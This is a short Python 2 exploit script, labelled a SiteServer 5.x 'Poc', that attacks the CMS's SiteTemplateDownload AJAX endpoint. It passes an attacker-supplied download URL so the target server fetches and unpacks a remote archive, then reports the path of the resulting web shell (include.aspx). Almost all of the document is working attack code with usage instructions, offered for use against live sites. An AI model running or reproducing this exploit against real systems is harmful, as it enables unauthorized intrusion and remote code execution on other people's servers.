#!/usr/bin/env python
# -*- coding: utf-8 -*- 
#Code by 1x2Bytes
import requests
import sys
reload(sys)
sys.setdefaultencoding('utf-8')



def to_exp(turl,rarurl):
    
    payload = "/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl="+rarurl+"&directoryName=test"
    ua_headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
    }
    expurl = turl+payload
    try:
       r = requests.get(url=turl)
       if r.status_code == 404:
           print"Url is breakout!"
       else:
           r2 = requests.get(url=expurl,headers=ua_headers,verify=False).text
           if "站点模板下载成功，请到站点模板管理中查看。" in r2:            
				print "[+]Shell: " + turl + "/SiteFiles/SiteTemplates/test/include.aspx"            
           else:
				print "[-]Maybe No vuln " + turl
    except requests.ConnectionError:
		print "[-] Cannot connect url " + turl

def main():
    print r'''

    SiteServer5.x vuln Poc by 1x2Bytes 
    usage: exp.py http:\\www.xxx.com
    <Thanks the Reporters:1u0hun>
    '''
    if not sys.argv[1] :
        print"input Url!!"
    else:
        rarurl=raw_input("Webshell Encrypt String:")
        vurl = sys.argv[1]
        to_exp(turl=vurl,rarurl=rarurl)
if __name__=='__main__':
    main()

    




